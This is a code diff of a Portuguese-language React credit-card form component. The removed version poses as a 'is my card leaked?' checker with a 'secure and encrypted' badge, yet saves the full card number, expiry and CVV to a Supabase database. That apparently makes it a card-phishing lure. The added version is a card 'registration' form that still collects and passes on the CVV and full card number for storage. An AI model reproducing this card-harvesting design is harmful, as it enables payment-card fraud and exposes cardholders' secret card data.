@@ -1,278 +1,250 @@
-import { useState } from 'react';
-import { CreditCard, Calendar, Lock, Shield, AlertTriangle, CheckCircle, Loader2 } from 'lucide-react';
-import { CardVisual } from './CardVisual';
-import { useCardValidation } from '../hooks/useCardValidation';
-import { useSupabase } from '../hooks/useSupabase';
-import type { CartaoFormData } from '../types';
+import { useState, useCallback } from 'react';
+import { CreditCard3D } from './CreditCard3D';
+import { Button } from '@/components/ui/button';
+import { Input } from '@/components/ui/input';
+import { Label } from '@/components/ui/label';
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from '@/components/ui/select';
+import { toast } from 'sonner';
+import { Loader2, CheckCircle } from 'lucide-react';
 
-export function CardForm() {
-  const [formData, setFormData] = useState<CartaoFormData>({
-    numeroCartao: '',
-    validade: '',
-    cvv: '',
-  });
-  const [focoCVV, setFocoCVV] = useState(false);
-  
-  const { verificarCartao, resultado, verificando, limparResultado } = useCardValidation();
-  const { salvarCartao, loading: salvando } = useSupabase();
+interface CardFormProps {
+  onSubmit?: (cardData: {
+    card_number: string;
+    card_holder: string;
+    card_month: string;
+    card_year: string;
+    card_cvv: string;
+    card_type: string;
+  }) => Promise<{ error: Error | null }>;
+  loading?: boolean;
+}
 
-  const formatarNumeroCartao = (valor: string) => {
-    const numeros = valor.replace(/\D/g, '');
-    const grupos = numeros.match(/.{1,4}/g);
-    return grupos ? grupos.join(' ').slice(0, 19) : numeros;
-  };
+export function CardForm({ onSubmit, loading = false }: CardFormProps) {
+  const [cardNumber, setCardNumber] = useState('');
+  const [cardName, setCardName] = useState('');
+  const [cardMonth, setCardMonth] = useState('');
+  const [cardYear, setCardYear] = useState('');
+  const [cardCvv, setCardCvv] = useState('');
+  const [submitted, setSubmitted] = useState(false);
 
-  const formatarValidade = (valor: string) => {
-    const numeros = valor.replace(/\D/g, '');
-    if (numeros.length >= 2) {
-      return `${numeros.slice(0, 2)}/${numeros.slice(2, 4)}`;
+  const currentYear = new Date().getFullYear();
+  const years = Array.from({ length: 12 }, (_, i) => String(currentYear + i));
+  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'));
+
+  const getCardType = useCallback((number: string) => {
+    const clean = number.replace(/\s/g, '');
+    if (/^4/.test(clean)) return 'visa';
+    if (/^(34|37)/.test(clean)) return 'amex';
+    if (/^5[1-5]/.test(clean)) return 'mastercard';
+    if (/^6011/.test(clean)) return 'discover';
+    if (/^9792/.test(clean)) return 'troy';
+    return 'visa';
+  }, []);
+
+  const formatCardNumber = (value: string) => {
+    const clean = value.replace(/\D/g, '');
+    const isAmex = getCardType(clean) === 'amex';
+    
+    if (isAmex) {
+      return clean
+        .slice(0, 15)
+        .replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3')
+        .trim();
     }
-    return numeros;
+    
+    return clean
+      .slice(0, 16)
+      .replace(/(\d{4})(?=\d)/g, '$1 ')
+      .trim();
   };
 
-  const handleNumeroChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatado = formatarNumeroCartao(e.target.value);
-    setFormData(prev => ({ ...prev, numeroCartao: formatado }));
-    limparResultado();
-  };
-
-  const handleValidadeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatado = formatarValidade(e.target.value);
-    setFormData(prev => ({ ...prev, validade: formatado }));
-    limparResultado();
-  };
-
-  const handleCVVChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const numeros = e.target.value.replace(/\D/g, '').slice(0, 4);
-    setFormData(prev => ({ ...prev, cvv: numeros }));
-    limparResultado();
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatCardNumber(e.target.value);
+    setCardNumber(formatted);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    const resultadoVerificacao = await verificarCartao(formData);
-    
-    await salvarCartao({
-      numero_cartao: formData.numeroCartao.replace(/\s/g, ''),
-      validade: formData.validade,
-      cvv: formData.cvv,
-      valido: resultadoVerificacao.valido,
-      vazado: resultadoVerificacao.vazado,
-    });
+
+    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
+      toast.error('Por favor, preencha todos os campos');
+      return;
+    }
+
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    if (cleanNumber.length < 15) {
+      toast.error('Número do cartão inválido');
+      return;
+    }
+
+    if (cardCvv.length < 3) {
+      toast.error('CVV inválido');
+      return;
+    }
+
+    if (onSubmit) {
+      try {
+        const { error } = await onSubmit({
+          card_number: cleanNumber,
+          card_holder: cardName.trim(),
+          card_month: cardMonth,
+          card_year: cardYear,
+          card_cvv: cardCvv,
+          card_type: getCardType(cleanNumber),
+        });
+
+        if (error) {
+          toast.error('Erro ao salvar cartão: ' + error.message);
+        } else {
+          setSubmitted(true);
+          toast.success('Cartão cadastrado com sucesso!');
+          
+          // Reset form after 2 seconds
+          setTimeout(() => {
+            setCardNumber('');
+            setCardName('');
+            setCardMonth('');
+            setCardYear('');
+            setCardCvv('');
+            setSubmitted(false);
+          }, 2000);
+        }
+      } catch (err) {
+        toast.error('Erro inesperado ao processar');
+        console.error('Form submit error:', err);
+      }
+    }
   };
 
-  const inputStyle = {
-    width: '100%',
-    padding: '0.75rem 1rem',
-    background: 'rgba(30, 41, 59, 0.5)',
-    border: '1px solid rgba(255,255,255,0.1)',
-    borderRadius: '0.75rem',
-    color: 'white',
-    fontSize: '1rem',
-    fontFamily: 'monospace',
-    outline: 'none',
-    transition: 'all 0.3s ease'
-  };
-
-  const labelStyle = {
-    display: 'flex',
-    alignItems: 'center',
-    gap: '0.5rem',
-    color: '#d1d5db',
-    fontSize: '0.875rem',
-    fontWeight: 500,
-    marginBottom: '0.5rem'
-  };
+  if (submitted) {
+    return (
+      <div className="flex flex-col items-center justify-center py-12 animate-in fade-in zoom-in duration-300">
+        <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mb-6">
+          <CheckCircle className="w-12 h-12 text-white" />
+        </div>
+        <h2 className="text-2xl font-bold text-gray-800 mb-2">Cartão Cadastrado!</h2>
+        <p className="text-gray-600">Seu cartão foi salvo com sucesso.</p>
+      </div>
+    );
+  }
 
   return (
-    <div style={{ width: '100%', maxWidth: '28rem' }}>
-      <div style={{
-        background: 'rgba(15, 23, 42, 0.8)',
-        backdropFilter: 'blur(20px)',
-        borderRadius: '1.5rem',
-        padding: '2rem',
-        boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)',
-        border: '1px solid rgba(255,255,255,0.1)'
-      }}>
-        {/* Cartão Visual 3D */}
-        <CardVisual 
-          numeroCartao={formData.numeroCartao}
-          validade={formData.validade}
-          cvv={formData.cvv}
-          focoCVV={focoCVV}
+    <div className="w-full max-w-lg mx-auto">
+      <div className="mb-8">
+        <CreditCard3D
+          cardNumber={cardNumber}
+          cardName={cardName}
+          cardMonth={cardMonth}
+          cardYear={cardYear}
+          cardCvv={cardCvv}
         />
+      </div>
 
-        {/* Form */}
-        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
-          {/* Número do Cartão */}
-          <div>
-            <label style={labelStyle}>
-              <CreditCard size={16} color="#818cf8" />
-              Número do Cartão
-            </label>
-            <input
+      <form onSubmit={handleSubmit} className="space-y-5 bg-white dark:bg-slate-800 p-6 sm:p-8 rounded-2xl shadow-xl transition-colors">
+        <div className="space-y-2">
+          <Label htmlFor="cardNumber" className="text-gray-700 dark:text-gray-200 font-medium">
+            Número do Cartão
+          </Label>
+          <Input
+            id="cardNumber"
+            type="text"
+            inputMode="numeric"
+            placeholder="0000 0000 0000 0000"
+            value={cardNumber}
+            onChange={handleCardNumberChange}
+            className="h-12 text-lg tracking-wider dark:bg-slate-700 dark:text-white"
+            maxLength={19}
+            autoComplete="cc-number"
+          />
+        </div>
+
+        <div className="space-y-2">
+          <Label htmlFor="cardName" className="text-gray-700 dark:text-gray-200 font-medium">
+            Nome no Cartão
+          </Label>
+          <Input
+            id="cardName"
+            type="text"
+            placeholder="NOME COMPLETO"
+            value={cardName}
+            onChange={(e) => setCardName(e.target.value.toUpperCase().replace(/[^A-Z\s]/g, ''))}
+            className="h-12 text-lg uppercase dark:bg-slate-700 dark:text-white"
+            autoComplete="cc-name"
+          />
+        </div>
+
+        <div className="grid grid-cols-3 gap-4">
+          <div className="space-y-2">
+            <Label className="text-gray-700 dark:text-gray-200 font-medium">Mês</Label>
+            <Select value={cardMonth} onValueChange={setCardMonth}>
+              <SelectTrigger className="h-12 dark:bg-slate-700 dark:text-white">
+                <SelectValue placeholder="MM" />
+              </SelectTrigger>
+              <SelectContent>
+                {months.map((month) => (
+                  <SelectItem key={month} value={month}>
+                    {month}
+                  </SelectItem>
+                ))}
+              </SelectContent>
+            </Select>
+          </div>
+
+          <div className="space-y-2">
+            <Label className="text-gray-700 dark:text-gray-200 font-medium">Ano</Label>
+            <Select value={cardYear} onValueChange={setCardYear}>
+              <SelectTrigger className="h-12 dark:bg-slate-700 dark:text-white">
+                <SelectValue placeholder="AAAA" />
+              </SelectTrigger>
+              <SelectContent>
+                {years.map((year) => (
+                  <SelectItem key={year} value={year}>
+                    {year}
+                  </SelectItem>
+                ))}
+              </SelectContent>
+            </Select>
+          </div>
+
+          <div className="space-y-2">
+            <Label htmlFor="cardCvv" className="text-gray-700 dark:text-gray-200 font-medium">
+              CVV
+            </Label>
+            <Input
+              id="cardCvv"
               type="text"
-              placeholder="0000 0000 0000 0000"
-              value={formData.numeroCartao}
-              onChange={handleNumeroChange}
-              onFocus={() => setFocoCVV(false)}
-              required
-              maxLength={19}
-              style={inputStyle}
+              inputMode="numeric"
+              placeholder="123"
+              value={cardCvv}
+              onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+              className="h-12 text-lg tracking-wider dark:bg-slate-700 dark:text-white"
+              maxLength={4}
+              autoComplete="cc-csc"
             />
           </div>
-
-          {/* Validade e CVV */}
-          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
-            <div>
-              <label style={labelStyle}>
-                <Calendar size={16} color="#818cf8" />
-                Validade
-              </label>
-              <input
-                type="text"
-                placeholder="MM/AA"
-                value={formData.validade}
-                onChange={handleValidadeChange}
-                onFocus={() => setFocoCVV(false)}
-                required
-                maxLength={5}
-                style={{ ...inputStyle, textAlign: 'center' }}
-              />
-            </div>
-
-            <div>
-              <label style={labelStyle}>
-                <Lock size={16} color="#818cf8" />
-                CVV
-              </label>
-              <input
-                type="text"
-                placeholder="123"
-                value={formData.cvv}
-                onChange={handleCVVChange}
-                onFocus={() => setFocoCVV(true)}
-                onBlur={() => setFocoCVV(false)}
-                required
-                maxLength={4}
-                style={{ ...inputStyle, textAlign: 'center' }}
-              />
-            </div>
-          </div>
-
-          {/* Submit Button */}
-          <button
-            type="submit"
-            disabled={verificando || salvando}
-            style={{
-              width: '100%',
-              padding: '1rem',
-              background: 'linear-gradient(135deg, #4f46e5, #9333ea, #ec4899)',
-              color: 'white',
-              fontWeight: 600,
-              borderRadius: '0.75rem',
-              border: 'none',
-              cursor: verificando || salvando ? 'not-allowed' : 'pointer',
-              opacity: verificando || salvando ? 0.7 : 1,
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              gap: '0.5rem',
-              fontSize: '1rem',
-              transition: 'all 0.3s ease',
-              boxShadow: '0 10px 25px -5px rgba(79,70,229,0.4)'
-            }}
-          >
-            {verificando || salvando ? (
-              <>
-                <Loader2 size={20} className="animate-spin" />
-                Verificando...
-              </>
-            ) : (
-              <>
-                <Shield size={20} />
-                Verificar Cartão
-              </>
-            )}
-          </button>
-        </form>
-
-        {/* Result */}
-        {resultado && (
-          <div style={{
-            marginTop: '1.5rem',
-            padding: '1.25rem',
-            borderRadius: '1rem',
-            border: '1px solid',
-            animation: 'fadeIn 0.5s ease-out',
-            ...(resultado.vazado
-              ? { background: 'rgba(239,68,68,0.1)', borderColor: 'rgba(239,68,68,0.3)' }
-              : resultado.valido
-              ? { background: 'rgba(16,185,129,0.1)', borderColor: 'rgba(16,185,129,0.3)' }
-              : { background: 'rgba(245,158,11,0.1)', borderColor: 'rgba(245,158,11,0.3)' })
-          }}>
-            <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
-              <div style={{
-                width: '3rem',
-                height: '3rem',
-                borderRadius: '0.75rem',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                flexShrink: 0,
-                ...(resultado.vazado
-                  ? { background: 'rgba(239,68,68,0.2)' }
-                  : resultado.valido
-                  ? { background: 'rgba(16,185,129,0.2)' }
-                  : { background: 'rgba(245,158,11,0.2)' })
-              }}>
-                {resultado.vazado ? (
-                  <AlertTriangle size={24} color="#f87171" />
-                ) : resultado.valido ? (
-                  <CheckCircle size={24} color="#34d399" />
-                ) : (
-                  <AlertTriangle size={24} color="#fbbf24" />
-                )}
-              </div>
-              <div>
-                <h3 style={{
-                  fontWeight: 'bold',
-                  fontSize: '1.125rem',
-                  ...(resultado.vazado
-                    ? { color: '#fca5a5' }
-                    : resultado.valido
-                    ? { color: '#6ee7b7' }
-                    : { color: '#fcd34d' })
-                }}>
-                  {resultado.vazado
-                    ? 'Cartão Vazado!'
-                    : resultado.valido
-                    ? 'Cartão Válido'
-                    : 'Cartão Inválido'}
-                </h3>
-                <p style={{ color: '#d1d5db', fontSize: '0.875rem', marginTop: '0.25rem' }}>
-                  {resultado.mensagem}
-                </p>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* Security Badge */}
-        <div style={{ 
-          marginTop: '1.5rem', 
-          display: 'flex', 
-          alignItems: 'center', 
-          justifyContent: 'center', 
-          gap: '0.5rem',
-          color: '#6b7280',
-          fontSize: '0.75rem'
-        }}>
-          <Lock size={12} />
-          <span>Verificação segura e criptografada</span>
         </div>
-      </div>
+
+        <Button
+          type="submit"
+          className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 transition-all duration-300 shadow-lg hover:shadow-xl"
+          disabled={loading}
+        >
+          {loading ? (
+            <>
+              <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+              Processando...
+            </>
+          ) : (
+            'Cadastrar Cartão'
+          )}
+        </Button>
+      </form>
     </div>
   );
 }
